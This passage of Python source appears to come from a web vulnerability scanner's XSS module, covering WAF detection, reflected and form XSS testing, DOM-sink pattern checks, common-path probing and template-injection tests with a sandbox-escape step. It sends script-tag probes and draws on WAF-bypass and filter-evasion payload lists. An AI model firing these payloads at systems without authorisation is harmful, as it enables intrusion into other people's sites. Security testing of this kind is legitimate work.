            "stats": {
                "waf_detected": self._detected_waf.value,
                "csp_present": self._csp_info.get("present", False),
                "endpoints_tested": len(endpoints) - skipped_endpoints,
                "endpoints_skipped_inter_module": skipped_endpoints,
                "forms_tested": len(forms),
                "js_files_analyzed": len(js_files),
                # THEME-9: Budget stats
                "budget_utilization": budget_info,
            }
        }
    
    async def _reconnaissance(
        self,
        host: str,
        rate_limiter: "RateLimiter",
    ) -> dict:
        """Initial reconnaissance to detect WAF and CSP."""
        await rate_limiter.acquire(host)
        
        result = {
            "waf": WAFType.NONE,
            "csp": {"present": False},
        }
        
        try:
            base = self._base_url or self._resolve_base_url(host)
            async with get_scan_client(timeout=self.timeout) as client:
                # Send benign request
                response = await client.get(f"{base}/")

                # Detect WAF
                result["waf"] = self.waf_detector.detect(response)

                # Analyze CSP
                result["csp"] = self.csp_analyzer.analyze(response)

                # Send XSS probe to confirm WAF
                await rate_limiter.acquire(host)
                probe_response = await client.get(
                    f"{base}/",
                    params={"test": "<script>alert(1)</script>"}
                )
                
                if self.waf_detector.is_blocked(probe_response):
                    if result["waf"] == WAFType.NONE:
                        result["waf"] = WAFType.UNKNOWN
                        
        except Exception as e:
            logger.debug(f"[XSS] Recon failed: {e}")
        
        return result
    
    def _check_endpoint_budget(self, endpoint: str, max_requests: int = 25) -> bool:
        """Check if we can make more requests to this endpoint."""
        if not hasattr(self, "_endpoint_request_counts"):
            self._endpoint_request_counts = {}
        count = self._endpoint_request_counts.get(endpoint, 0)
        return count < max_requests

    def _track_endpoint_request(self, endpoint: str) -> None:
        """Track a request made to an endpoint."""
        if not hasattr(self, "_endpoint_request_counts"):
            self._endpoint_request_counts = {}
        self._endpoint_request_counts[endpoint] = self._endpoint_request_counts.get(endpoint, 0) + 1

    async def _test_endpoint_xss(
        self,
        endpoint: str,
        rate_limiter: "RateLimiter",
    ) -> list[dict]:
        """Test endpoint for XSS with advanced techniques."""
        findings = []

        parsed = urlparse(endpoint)

        # JUICE-SHOP-FIX 2026-02-11: Support hash-based routes (SPA routing)
        # URLs like http://localhost:3000/#/search?q=test have params in fragment, not query
        # urlparse puts everything after # in fragment, leaving query empty
        query_string = parsed.query
        if not query_string and parsed.fragment and '?' in parsed.fragment:
            # Extract query from fragment: /#/search?q=test -> q=test
            fragment_parts = parsed.fragment.split('?', 1)
            if len(fragment_parts) == 2:
                query_string = fragment_parts[1]
                logger.debug(f"[XSS] Detected hash-based route, params in fragment: {query_string}")

        if not query_string:
            return findings

        params = parse_qs(query_string)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        # For hash routes, we need to preserve the fragment path
        if parsed.fragment and '?' in parsed.fragment:
            fragment_path = parsed.fragment.split('?')[0]
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}#{fragment_path}"
        host = parsed.netloc

        # RATE-01: Per-endpoint budget constant
        MAX_REQUESTS_PER_ENDPOINT = 25

        for param_name in params:
            # THEME-9: Check if this param was already tested for reflectability
            should_skip, skip_reason = self.should_skip_hypothesis(endpoint, param_name, "reflectable")
            if should_skip:
                logger.debug(f"[XSS] Skipping param {param_name}: {skip_reason}")
                continue

            # THEME-9: Check per-param budget
            if not self.can_test_param(param_name):
                logger.debug(f"[XSS] Per-param budget exhausted for {param_name}")
                continue

            # Generate unique canary
            canary = self._generate_canary()

            # Test reflection
            test_params = params.copy()
            test_params[param_name] = [canary]  # FIX: Use param_name, not i_param_name

            try:
                async with get_scan_client(
                    timeout=self.timeout,
                    custom_headers=self._auth_headers,
                ) as client:
                    await rate_limiter.acquire(host)
                    response = await client.get(
                        base_url,
                        params={k: v[0] for k, v in test_params.items()}
                    )

                    # JUICE-SHOP-FIX 2026-02-11: Check reflection FIRST, then filter
                    # Previous logic: SPA detected → skip (wrong!)
                    # New logic: If canary reflected → test it regardless of SPA
                    # SPAs can still have reflected XSS (Angular, React, Vue all vulnerable)

                    if canary not in response.text:
                        continue  # Not reflected, nothing to test

                    # Only skip if response is truly useless (error page, empty, etc.)
                    # BUT: If we got reflection, SPA shell doesn't matter - test it!
                    if hasattr(self, "_ctx"):
                        is_meaningful = self._ctx.is_meaningful_response(
                            response.text,
                            response.status_code,
                            response.headers.get("content-type", ""),
                            base_url,
                        )
                        # Even if SPA, if we have reflection, STILL TEST IT
                        if not is_meaningful and response.status_code >= 400:
                            logger.debug(f"[XSS] Skipping {param_name} - error response {response.status_code}")
                            continue
                        # Log if SPA detected but continuing anyway
                        if not is_meaningful:
                            logger.debug(f"[XSS] SPA detected but canary reflected - testing {param_name}")

                    # Detect context
                    context = self._detect_context(response.text, canary)
                    logger.debug(f"[XSS] Reflection in {context.name} for param {param_name}")
                    
                    # Get payloads for context
                    payloads = self._get_payloads_for_context(context)
                    
                    # Add WAF bypass payloads if WAF detected
                    if self._detected_waf != WAFType.NONE:
                        waf_payloads = self.WAF_BYPASS_PAYLOADS.get(self._detected_waf, [])
                        payloads = waf_payloads + payloads
                    
                    # Add polyglot payloads from library (2026-02-20)
                    library_polyglots = self._get_library_polyglot_payloads(max_payloads=10)
                    payloads = library_polyglots + self.POLYGLOT_PAYLOADS + payloads

                    # Add PHP legacy bypass payloads for filter evasion
                    # These are critical for DVWA, bWAPP, Mutillidae, etc.
                    payloads = payloads + self.PHP_LEGACY_BYPASS_PAYLOADS

                    # PERF-FIX 2026-02-20: Try intelligent payload selection first
                    intelligent_payloads = await self._get_intelligent_payloads(
                        category="xss",
                        endpoint=endpoint,
                        param_name=param_name,
                        max_payloads=30,
                        asset_data=getattr(self, '_asset_data', None),
                    )
                    if intelligent_payloads:
                        # Merge: intelligent first, then fallback to context-based
                        intelligent_strs = [p[0] for p in intelligent_payloads]
                        payloads = intelligent_strs + [p for p in payloads if p not in intelligent_strs]
                        logger.debug(f"[XSS] Using {len(intelligent_strs)} intelligent payloads first")

                    # Test payloads with cross-validation
                    # RATE-01: Enforce per-endpoint budget
                    # THEME-1 FIX: Test more payloads and continue after findings
                    param_findings_count = 0
                    for payload in payloads[:self.max_payloads_per_param]:
                        # Check budget before each request
                        if not self._check_endpoint_budget(endpoint, MAX_REQUESTS_PER_ENDPOINT):
                            logger.debug(f"[XSS] Budget exhausted for {endpoint}")
                            break

                        # THEME-1 FIX: Stop when we have enough findings for this param
                        if param_findings_count >= self.max_findings_per_param:
                            logger.debug(f"[XSS] Found {param_findings_count} XSS for {param_name}, moving on")
                            break

                        self._track_endpoint_request(endpoint)
                        result = await self._test_payload_with_validation(
                            client, base_url, param_name, payload,
                            params, context, rate_limiter, host
                        )

                        if result and result.confidence >= MIN_CONFIDENCE_THRESHOLD:
                            finding = self._create_finding_and_record(
                                result, base_url, param_name, "URL Parameter"
                            )
                            findings.append(finding.to_dict())
                            param_findings_count += 1
                            # THEME-1 FIX: Continue testing to find different contexts/payloads
                            
            except Exception as e:
                logger.debug(f"[XSS] Test failed for {param_name}: {e}")
        
        return findings
    
    async def _test_payload_with_validation(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        param_name: str,
        payload: str,
        original_params: dict,
        context: XSSContext,
        rate_limiter: "RateLimiter",
        host: str,
    ) -> XSSResult | None:
        """Test payload with cross-validation for confidence scoring."""
        confirmations = 0
        evidence_list = []
        
        # Generate mutations with WAFBypassEngine integration (2026-02-20)
        # FIX 2026-02-16: Increased from 5 to 15 to test HTML entity encodings
        mutations = self._get_payload_mutations(payload, mutation_level=2)[:15]
        
        for mutation in mutations:
            await rate_limiter.acquire(host)
            
            test_params = original_params.copy()
            test_params[param_name] = [mutation]
            
            try:
                response = await client.get(
                    base_url,
                    params={k: v[0] for k, v in test_params.items()}
                )
                
                # Check if blocked
                if self.waf_detector.is_blocked(response):
                    continue

                # 2026-02-20: Use enhanced reflection analysis with PayloadEchoDetector
                # This provides better context detection and escape identification
                content_type = response.headers.get("content-type", "")
                is_reflected, echo_analysis = self._check_xss_reflection_enhanced(
                    response.text, mutation, content_type
                )

                if is_reflected:
                    confirmations += 1

                    # Extract reflection details from echo_analysis
                    reflected_in = "response_body"
                    encoding_used = "none" if mutation == payload else "mutated"

                    if echo_analysis:
                        # Use detailed context from PayloadEchoDetector
                        if echo_analysis.context:
                            reflected_in = echo_analysis.context
                        if echo_analysis.escape_method:
                            encoding_used = echo_analysis.escape_method

                    # Find reflection location
                    snippet = self._extract_reflection_snippet(response.text, mutation)

                    evidence_list.append(XSSEvidence(
                        payload=mutation,
                        context=context,
                        reflected_in=reflected_in,
                        encoding_used=encoding_used,
                        waf_bypassed=self._detected_waf != WAFType.NONE,
                        response_snippet=snippet,
                        confirmation_count=confirmations,
                    ))
                    
            except (httpx.RequestError, asyncio.TimeoutError) as e:
                logger.debug(f"[XSS] Request error during testing: {e}")
                continue
            except Exception as e:
                logger.warning(f"[XSS] Unexpected error during testing: {e}")
                continue

        if confirmations >= CROSS_VALIDATION_REQUIRED:
            confidence = self._calculate_confidence(
                confirmations=confirmations,
                context=context,
                waf_detected=self._detected_waf != WAFType.NONE,
                csp_present=self._csp_info.get("present", False),
            )
            
            return XSSResult(
                vulnerable=True,
                context=context,
                confidence_score=confidence,
                payload=payload,
                evidence=evidence_list,
                waf_detected=self._detected_waf,
                csp_present=self._csp_info.get("present", False),
            )
        
        return None

    def _build_form_definition(
        self,
        action: str,
        method: str,
        inputs: list[dict],
    ) -> FormDefinition:
        """Convert crawler's dict-based form to FormDefinition for context preservation.

        2026-02-20: Helper for FormContextPreserver integration.
        """
        fields = []
        for inp in inputs:
            name = inp.get("name", "")
            if not name:
                continue

            input_type = inp.get("type", "text").lower()
            value = inp.get("value", "")

            # Detect field type from name and input type
            field_type = self._detect_field_type_for_preserver(name, input_type)

            # Check if CSRF token
            is_csrf = any(ind in name.lower() for ind in [
                "csrf", "token", "_token", "user_token", "nonce", "authenticity"
            ])

            fields.append(FieldDefinition(
                name=name,
                field_type=field_type,
                is_required=inp.get("required", False),
                default_value=value if value else None,
                is_injectable=not is_csrf and input_type not in ["hidden", "submit", "button", "file"],
                is_csrf=is_csrf,
            ))

        return FormDefinition(
            action=action,
            method=method,
            fields=fields,
            discovered_from=action,
        )

    def _detect_field_type_for_preserver(self, name: str, input_type: str) -> FieldType:
        """Detect FieldType from field name and HTML input type."""
        name_lower = name.lower()

        # HTML5 type mappings
        type_map = {
            "email": FieldType.EMAIL,
            "password": FieldType.PASSWORD,
            "tel": FieldType.PHONE,
            "url": FieldType.URL,
            "number": FieldType.NUMBER,
            "date": FieldType.DATE,
            "hidden": FieldType.HIDDEN,
        }
        if input_type in type_map:
            return type_map[input_type]

        # Name-based detection
        if any(p in name_lower for p in ["email", "e-mail", "mail"]):
            return FieldType.EMAIL
        if any(p in name_lower for p in ["password", "passwd", "pwd", "pass"]):
            return FieldType.PASSWORD
        if any(p in name_lower for p in ["phone", "tel", "mobile"]):
            return FieldType.PHONE
        if any(p in name_lower for p in ["username", "user", "login"]):
            return FieldType.USERNAME
        if any(p in name_lower for p in ["csrf", "token", "_token", "nonce"]):
            return FieldType.CSRF
        if any(p in name_lower for p in ["amount", "price", "total"]):
            return FieldType.AMOUNT
        if any(p in name_lower for p in ["quantity", "qty"]):
            return FieldType.QUANTITY
        if name_lower.endswith("_id") or name_lower == "id":
            return FieldType.ID

        return FieldType.TEXT

    async def _test_form_xss(
        self,
        host: str,
        form: dict,
        rate_limiter: "RateLimiter",
    ) -> list[dict]:
        """Test form for XSS vulnerabilities.

        2026-02-20: Now uses FormContextPreserver to maintain valid values
        in non-target fields during injection testing. This prevents false
        negatives caused by server-side validation rejecting empty fields.

        Example problem solved:
        - Form has username, password fields
        - Testing XSS in username with password="" → "Password required" error
        - Now: password="Test1234!" while testing username
        """
        findings = []

        action = form.get("action", "/")
        method = form.get("method", "GET").upper()
        inputs = form.get("inputs", [])

        if not action.startswith("http"):
            base = self._base_url or self._resolve_base_url(host)
            action = f"{base}{action}" if action.startswith("/") else f"{base}/{action}"

        # 2026-02-20: Convert dict-based form to FormDefinition for context preservation
        form_def = self._build_form_definition(action, method, inputs)
        preserver = FormContextPreserver()

        for field_def in form_def.get_injectable_fields():
            field_name = field_def.name

            # THEME-1 FIX: Test more polyglot payloads for thorough form coverage
            # PHP-LEGACY-FIX: Include PHP bypass payloads for DVWA/bWAPP/Mutillidae
            # 2026-02-20: Add library payloads first, then hardcoded fallback
            library_polyglots = self._get_library_polyglot_payloads(max_payloads=12)
            form_payloads = library_polyglots + self.POLYGLOT_PAYLOADS[:12] + self.PHP_LEGACY_BYPASS_PAYLOADS[:15]
            form_field_findings = 0
            for payload in form_payloads:
                # THEME-1 FIX: Continue after findings but cap at max
                if form_field_findings >= self.max_findings_per_param:
                    break

                # 2026-02-20: Use FormContextPreserver to get test data
                # with valid values in non-target fields
                test_data = preserver.get_test_data(
                    form=form_def,
                    target_field=field_name,
                    injection_payload=payload,
                )

                try:
                    async with get_scan_client(timeout=self.timeout) as client:
                        await rate_limiter.acquire(host)

                        if method == "POST":
                            response = await client.post(action, data=test_data)
                        else:
                            response = await client.get(action, params=test_data)

                        if self.waf_detector.is_blocked(response):
                            continue

                        if self._check_xss_reflection(response.text, payload):
                            context = self._detect_context(response.text, payload)
                            confidence = self._calculate_confidence(
                                confirmations=1,
                                context=context,
                                waf_detected=self._detected_waf != WAFType.NONE,
                                csp_present=self._csp_info.get("present", False),
                            )

                            if confidence >= MIN_CONFIDENCE_THRESHOLD:
                                findings.append(Finding(
                                    vuln_type=VulnType.XSS_REFLECTED,
                                    category=VulnCategory.INJECTION,
                                    name=f"Reflected XSS in Form ({context.name})",
                                    severity=Severity.HIGH,
                                    description=(
                                        f"Cross-Site Scripting vulnerability in form field '{field_name}'. "
                                        f"User input is reflected in {context.name} context without proper sanitization. "
                                        f"Confidence: {confidence}%"
                                    ),
                                    host=host,
                                    endpoint=action,
                                    evidence=[
                                        f"Form Action: {action}",
                                        f"Method: {method}",
                                        f"Field: {field_name}",
                                        f"Context: {context.name}",
                                        f"Payload: {payload}",
                                        f"WAF Bypassed: {self._detected_waf != WAFType.NONE}",
                                    ],
                                    cvss_score=6.1,
                                    cwe_id="CWE-79",
                                    confidence_score=confidence,
                                    remediation=(
                                        "1. Implement context-aware output encoding\n"
                                        "2. Use Content-Security-Policy headers\n"
                                        "3. Sanitize all user input before reflection\n"
                                        "4. Use HTTPOnly cookies to prevent cookie theft"
                                    ),
                                    references=[
                                        "https://owasp.org/www-community/attacks/xss/",
                                        "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
                                    ],
                                ).to_dict())
                                form_field_findings += 1
                                # THEME-1 FIX: Continue to find more contexts/payloads
                                
                except Exception as e:
                    logger.debug(f"[XSS] Form test failed: {e}")
        
        return findings
    
    async def _analyze_dom_xss(
        self,
        host: str,
        js_url: str,
    ) -> list[dict]:
        """Analyze JavaScript for DOM XSS vulnerabilities."""
        findings = []
        
        try:
            async with get_scan_client(timeout=self.timeout) as client:
                response = await client.get(js_url)
                js_code = response.text
                
                # Find sources and sinks
                sources_found = []
                sinks_found = []
                
                for source in self.DOM_SOURCES:
                    if source in js_code:
                        sources_found.append(source)
                
                for sink in self.DOM_SINKS:
                    if sink in js_code:
                        sinks_found.append(sink)
                
                # Check for dangerous patterns
                dangerous_patterns = [
                    (r'innerHTML\s*=\s*.*location', "Direct innerHTML from location"),
                    (r'document\.write\s*\(.*location', "document.write with location"),
                    (r'eval\s*\(.*location', "eval with location data"),
                    (r'\.html\s*\(.*location', "jQuery .html() with location"),
                    (r'innerHTML\s*=.*\+.*\.value', "innerHTML with user input"),
                    (r'outerHTML\s*=', "outerHTML assignment"),
                    (r'insertAdjacentHTML\s*\(', "insertAdjacentHTML usage"),
                ]
                
                for pattern, description in dangerous_patterns:
                    matches = re.findall(pattern, js_code, re.IGNORECASE)
                    if matches:
                        # Calculate confidence based on context
                        confidence = 60
                        if sources_found and sinks_found:
                            confidence = 85
                        
                        findings.append(Finding(
                            vuln_type=VulnType.XSS_DOM,
                            name=f"Potential DOM XSS: {description}",
                            severity=Severity.MEDIUM,
                            description=(
                                f"Potential DOM-based XSS vulnerability detected in JavaScript. "
                                f"Pattern: {description}. "
                                f"Sources found: {', '.join(sources_found[:5]) or 'None'}. "
                                f"Sinks found: {', '.join(sinks_found[:5]) or 'None'}."
                            ),
                            host=host,
                            endpoint=js_url,
                            evidence=[
                                f"Pattern: {pattern}",
                                f"Sources: {sources_found[:5]}",
                                f"Sinks: {sinks_found[:5]}",
                            ],
                            cvss_score=5.4,
                            cwe_id="CWE-79",
                            confidence_score=confidence,
                            remediation=(
                                "1. Avoid using innerHTML with user-controlled data\n"
                                "2. Use textContent instead of innerHTML when possible\n"
                                "3. Sanitize data before using in DOM manipulation\n"
                                "4. Use DOMPurify library for sanitization"
                            ),
                        ).to_dict())
                        
        except Exception as e:
            logger.debug(f"[XSS] DOM analysis failed: {e}")
        
        return findings
    
    async def _test_common_vectors(
        self,
        host: str,
        rate_limiter: "RateLimiter",
    ) -> list[dict]:
        """Test common XSS injection points."""
        findings = []
        base = self._base_url or self._resolve_base_url(host)

        # SPA-FIX 2026-02-12: Skip common vectors on SPAs
        # SPAs return the same HTML for all params - testing is wasteful
        # Instead, XSS on SPAs is detected via DOM analysis (Phase 4) and API endpoints (Phase 2)
        try:
            async with get_scan_client(timeout=10.0) as client:
                homepage = await client.get(f"{base}/")
                homepage_text = homepage.text.lower()

                # Detect SPA frameworks - they don't reflect URL params in HTML
                spa_indicators = [
                    'ng-app', 'ng-controller', 'data-ng-',  # Angular
                    '__next', '_next/static', 'next/router',  # Next.js
                    'window.__NUXT__', '__nuxt',  # Nuxt
                    'data-reactroot', 'react-root', '_reactRoot',  # React
                    'data-v-', 'v-cloak', '__vue__',  # Vue
                    'data-svelte', '__svelte',  # Svelte
                    'ember-application', 'data-ember',  # Ember
                    '<app-root>', 'ng-version',  # Angular 2+
                ]

                is_spa = any(ind.lower() in homepage_text for ind in spa_indicators)

                if is_spa:
                    logger.info(f"[XSS] SPA detected - skipping common_vectors on homepage (DOM XSS tested separately)")
                    return findings
        except Exception as e:
            logger.debug(f"[XSS] SPA detection failed: {e}")

        # FIX 2026-02-16: Common XSS-VULNERABLE PATHS (not just params on homepage)
        # Traditional XSS labs and real apps have XSS at specific paths
        common_xss_paths = [
            # Search endpoints (highest XSS probability)
            "/search", "/search.php", "/search.asp", "/search.aspx", "/search.jsp",
            "/query", "/find", "/lookup", "/results",
            # Reflection endpoints
            "/reflect", "/echo", "/mirror", "/display", "/show", "/view",
            "/print", "/output", "/render", "/preview",
            # Error/debug pages
            "/error", "/error.php", "/404", "/debug", "/test",
            # User input pages
            "/guestbook", "/guestbook.php", "/comment", "/comments", "/feedback",
            "/message", "/contact", "/form", "/input", "/submit",
            # Profile/user pages
            "/profile", "/user", "/account", "/settings", "/preferences",
            # Content pages
            "/page", "/article", "/post", "/blog", "/news",
            "/product", "/item", "/detail", "/info",
            # API endpoints that reflect
            "/api/search", "/api/echo", "/api/test", "/api/debug",
            "/rest/search", "/rest/query",
            # Common vulnerable paths in real apps
            "/index.php", "/default.asp", "/home", "/main",
            "/login", "/register", "/signup", "/forgot",
        ]

        # Common vulnerable parameters (generic across frameworks)
        common_params = [
            # Search/query
            "q", "query", "search", "s", "keyword", "keywords", "term",
            # User input
            "name", "user", "username", "email", "message", "msg",
            "text", "content", "comment", "body", "title", "subject",
            # Redirects
            "url", "redirect", "return", "next", "callback", "goto", "target",
            # File/path
            "id", "page", "file", "path", "lang", "language", "view",
            # Debug/error
            "error", "err", "debug", "status",
            # Feedback/reviews
            "feedback", "rating", "review", "author", "description",
            # User IDs (IDOR vectors)
            "user_id", "userId", "uid", "profile_id",
        ]

        # FIX 2026-02-16: Test PATHS + PARAMS (not just homepage)
        # This is critical for traditional XSS labs and real apps where XSS is at specific paths
        paths_to_test = ["/"] + common_xss_paths  # Include homepage + common paths
        total_findings = 0
        max_total_findings = 20  # Cap to prevent excessive findings

        try:
            async with get_scan_client(timeout=self.timeout) as client:
                for path in paths_to_test[:30]:  # Limit paths tested
                    if total_findings >= max_total_findings:
                        break

                    test_url = f"{base}{path}" if path.startswith("/") else f"{base}/{path}"

                    # First check if path exists (200 OK)
                    try:
                        await rate_limiter.acquire(host)
                        check_resp = await client.get(test_url)
                        if check_resp.status_code >= 400:
                            continue  # Path doesn't exist, skip
                    except Exception:
                        continue

                    # Test each parameter on this path
                    for param in common_params[:15]:  # Limit params per path
                        if total_findings >= max_total_findings:
                            break

                        param_findings = 0

                        # 2026-02-20: Use library payloads with fallback
                        top_polyglots = self._get_library_polyglot_payloads(max_payloads=5)
                        for payload in top_polyglots:  # Top 5 polyglots from library
                            if param_findings >= 2:  # 2 findings per param is enough
                                break

                            try:
                                await rate_limiter.acquire(host)
                                response = await client.get(test_url, params={param: payload})

                                if self.waf_detector.is_blocked(response):
                                    continue

                                if self._check_xss_reflection(response.text, payload):
                                    context = self._detect_context(response.text, payload)

                                    # Cross-validate
                                    await rate_limiter.acquire(host)
                                    response2 = await client.get(test_url, params={param: payload})

                                    if self._check_xss_reflection(response2.text, payload):
                                        confidence = self._calculate_confidence(
                                            confirmations=2,
                                            context=context,
                                            waf_detected=self._detected_waf != WAFType.NONE,
                                            csp_present=self._csp_info.get("present", False),
                                        )

                                        if confidence >= MIN_CONFIDENCE_THRESHOLD:
                                            findings.append(Finding(
                                                vuln_type=VulnType.XSS_REFLECTED,
                                    category=VulnCategory.INJECTION,
                                                name=f"Reflected XSS in {path} ({context.name})",
                                                severity=Severity.HIGH,
                                                description=(
                                                    f"XSS vulnerability found at {path} via parameter '{param}'. "
                                                    f"Context: {context.name}. Confidence: {confidence}%"
                                                ),
                                                host=host,
                                                endpoint=f"{test_url}?{param}=",
                                                evidence=[
                                                    f"Path: {path}",
                                                    f"Parameter: {param}",
                                                    f"Context: {context.name}",
                                                    f"Payload: {payload}",
                                                ],
                                                cvss_score=6.1,
                                                cwe_id="CWE-79",
                                                confidence_score=confidence,
                                                remediation="Implement proper input validation and output encoding.",
                                            ).to_dict())
                                            param_findings += 1
                                            total_findings += 1
                                            logger.info(f"[XSS] Found XSS at {path}?{param}= ({context.name})")

                            except Exception as e:
                                logger.debug(f"[XSS] Error testing {path}?{param}: {e}")

        except Exception as e:
            logger.debug(f"[XSS] Common vector test failed: {e}")
        
        return findings
    
    # ==========================================================================
    # TEMPLATE INJECTION (Angular/Vue/React/Handlebars/EJS)
    # ==========================================================================

    async def _test_template_injection(
        self,
        host: str,
        endpoints: list[str],
        rate_limiter: "RateLimiter",
    ) -> list[dict]:
        """Test for client-side template injection in Angular/Vue/React apps.

        Dedup: ONE finding per (framework, endpoint_path).  All affected
        parameters are collected into a single finding to avoid report spam.
        """
        findings: list[dict] = []
        base_url = self._base_url

        test_params = ["q", "search", "query", "name", "title", "message", "text", "value", "input", "data"]

        # FIX 2026-02-12: Skip static files - they naturally contain "49" and cause FPs
        STATIC_EXTENSIONS = {".js", ".css", ".map", ".woff", ".woff2", ".ttf", ".eot", ".svg", ".png", ".jpg", ".gif", ".ico", ".webp"}

        test_urls = []
        for ep in endpoints[:5]:
            parsed = urlparse(ep)
            path_lower = parsed.path.lower()

            # Skip static files - checking for "49" in JS bundles causes false positives
            if any(path_lower.endswith(ext) for ext in STATIC_EXTENSIONS):
                logger.debug(f"[XSS] Skipping static file from template injection: {ep}")
                continue

            if parsed.query:
                test_urls.append(ep)
            else:
                for p in test_params[:5]:
                    test_urls.append(f"{ep}?{p}=TEMPLATE_TEST")

        if not test_urls:
            test_urls = [f"{base_url}/?q=TEMPLATE_TEST"]

        headers = dict(self._auth_headers) if hasattr(self, "_auth_headers") else {}

        # Dedup: (framework, path) → list of affected param names
        detected: dict[tuple[str, str], list[str]] = {}
        sandbox_escaped: set[tuple[str, str]] = set()

        async with get_scan_client(timeout=self.timeout) as client:
            for url_template in test_urls[:10]:
                for payload, payload_name in self.TEMPLATE_INJECTION_PAYLOADS:
                    if not payload_name.endswith("_expression"):
                        continue

                    await rate_limiter.acquire(host)

                    parsed = urlparse(url_template)
                    params = parse_qs(parsed.query)
                    if not params:
                        continue

                    param_name = list(params.keys())[0]
                    test_params_dict = {k: v[0] for k, v in params.items()}
                    test_params_dict[param_name] = payload
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params_dict)}"

                    try:
                        resp = await client.get(test_url, headers=headers)

                        # FIX 2026-02-12: Verify response is HTML, not JS/CSS
                        # JS bundles naturally contain "49" causing false positives
                        content_type = resp.headers.get("content-type", "").lower()
                        if "javascript" in content_type or "css" in content_type:
                            continue
                        # Also skip if response looks like JS (starts with function/var/const/let/import)
                        text_start = resp.text[:200].strip()
                        if text_start.startswith(("function", "var ", "const ", "let ", "import ", "export ", "(function", "!function", "window.")):
                            continue

                        if self.TEMPLATE_MATH_RESULT in resp.text and payload not in resp.text:
                            # GAP-A6 FIX 2026-02-18: Comprehensive tech fingerprint validation
                            # Prevents false positives like reporting "EJS Template Injection" on PHP servers
                            framework = None  # Changed from "Unknown" - must be explicitly set

                            # Get detected technologies from ScanContext/asset_data
                            detected_frameworks = []
                            detected_server = None
                            if hasattr(self, '_ctx') and self._ctx:
                                ctx_tech = getattr(self._ctx, '_asset_data', {}).get('technologies', [])
                                if ctx_tech:
                                    detected_frameworks = [str(t).lower() for t in ctx_tech]
                                # Also get server technology
                                server_info = getattr(self._ctx, '_asset_data', {}).get('server', '')
                                if server_info:
                                    detected_server = str(server_info).lower()

                            # Detect server type from response headers as fallback
                            if not detected_server:
                                server_header = resp.headers.get('server', '').lower()
                                x_powered = resp.headers.get('x-powered-by', '').lower()
                                if 'php' in x_powered or 'php' in server_header:
                                    detected_server = 'php'
                                elif 'express' in x_powered or 'node' in x_powered:
                                    detected_server = 'node.js'
                                elif 'apache' in server_header and 'php' not in server_header:
                                    # Apache alone might serve PHP
                                    if any('php' in f for f in detected_frameworks):
                                        detected_server = 'php'
                                elif 'nginx' in server_header:
                                    if any('php' in f for f in detected_frameworks):
                                        detected_server = 'php'

                            # Map payload syntax to valid technologies
                            # {{}} syntax is ONLY valid for: Jinja2(Python), Twig(PHP+Twig), Angular/Vue(client-side JS)
                            # PHP WITHOUT Twig does NOT process {{}} syntax natively!
                            payload_type = None
                            for pt in ['angular', 'vue', 'ejs', 'pug']:
                                if pt in payload_name:
                                    payload_type = pt
                                    break

                            # Payload-to-server compatibility map
                            # Key = payload type, Value = (valid server techs, valid client techs)
                            payload_server_map = {
                                'angular': ([], ['angular', 'angularjs']),  # Client-side only
                                'vue': ([], ['vue', 'vue.js', 'nuxt']),     # Client-side only
                                'ejs': (['node', 'express'], []),           # Node.js only!
                                'pug': (['node', 'express'], []),           # Node.js only!
                            }

                            # Check if payload is valid for detected environment
                            if payload_type:
                                valid_servers, valid_clients = payload_server_map.get(payload_type, ([], []))

                                # Check for valid client-side framework (Angular, Vue)
                                client_match = None
                                for det in detected_frameworks:
                                    for vc in valid_clients:
                                        if vc in det:
                                            client_match = det
                                            break
                                    if client_match:
                                        break

                                # Check for valid server-side framework (EJS, Pug need Node.js)
                                server_match = None
                                if detected_server:
                                    for vs in valid_servers:
                                        if vs in detected_server:
                                            server_match = detected_server
                                            break

                                if client_match:
                                    # Valid client-side framework detected
                                    framework = client_match.title().replace('.Js', '.js')
                                    logger.debug(f"[XSS] CSTI framework verified (client-side): {framework}")
                                elif server_match:
                                    # Valid server-side framework detected
                                    framework = payload_type.upper() if payload_type in ['ejs'] else payload_type.title()
                                    logger.debug(f"[XSS] CSTI framework verified (server-side): {framework}")
                                elif detected_server == 'php':
                                    # GAP-A6 CRITICAL: PHP server + {{}} payload = FALSE POSITIVE
                                    # PHP does NOT process {{}} syntax natively
                                    # EJS and Pug are Node.js template engines, NOT PHP!
                                    logger.info(f"[AUDIT][XSS] CSTI FP prevented: payload={payload_type} on PHP server")
                                    continue  # SKIP this false positive
                                elif detected_server and payload_type in ['ejs', 'pug']:
                                    # EJS/Pug payload but server is NOT Node.js - skip
                                    logger.info(f"[AUDIT][XSS] CSTI FP prevented: {payload_type} requires Node.js, server={detected_server}")
                                    continue  # SKIP this false positive
                                else:
                                    # No fingerprint data - check for any JS framework indication
                                    has_js_framework = any(f in ' '.join(detected_frameworks) for f in ['react', 'vue', 'angular', 'svelte', 'next', 'nuxt'])
                                    if has_js_framework:
                                        # Some JS framework detected - use it
                                        for det in detected_frameworks:
                                            if 'react' in det:
                                                framework = "React (Server-Side)"
                                            elif 'vue' in det:
                                                framework = "Vue.js"
                                            elif 'angular' in det:
                                                framework = "Angular"
                                            elif 'svelte' in det:
                                                framework = "Svelte"
                                            elif 'next' in det:
                                                framework = "Next.js"
                                            elif 'nuxt' in det:
                                                framework = "Nuxt.js"
                                            if framework:
                                                break
                                        logger.debug(f"[XSS] CSTI using detected JS framework: {framework}")
                                    else:
                                        # No framework detected at all - skip to avoid FP
                                        logger.info(f"[AUDIT][XSS] CSTI skipped: no valid framework detected for {payload_type}")
                                        continue  # SKIP - cannot verify vulnerability

                            # Final check: if framework is still None, skip
                            if not framework:
                                logger.debug(f"[XSS] CSTI skipped: could not determine framework for {payload_name}")
                                continue

                            key = (framework, parsed.path)
                            detected.setdefault(key, [])
                            if param_name not in detected[key]:
                                detected[key].append(param_name)
                                logger.info(f"[XSS] CSTI ({framework}) at {parsed.path} param={param_name}")

                            # Sandbox escape: try once per (framework, path)
                            if key not in sandbox_escaped:
                                for exploit_payload, exploit_name in self.TEMPLATE_INJECTION_PAYLOADS:
                                    if exploit_name.endswith("_expression"):
                                        continue
                                    if framework.lower() not in exploit_name:
                                        continue
                                    await rate_limiter.acquire(host)
                                    test_params_dict[param_name] = exploit_payload
